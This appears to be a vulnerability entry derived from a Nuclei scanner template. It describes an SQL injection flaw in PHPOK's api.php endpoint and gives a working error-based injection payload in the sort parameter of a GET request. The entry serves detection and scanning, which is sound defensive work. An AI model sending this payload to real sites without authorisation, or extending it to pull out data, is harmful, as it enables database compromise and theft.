# Vulnerability: PHPOK - SQL Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`phpok-sqli.yaml`)

## Description
PHPOK contains a SQL injection vulnerability via a GET request. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/api.php?c=project&f=index&token=1234&id=news&sort=1 and extractvalue(1,concat(0x7e,md5({{num}}))) --+
```

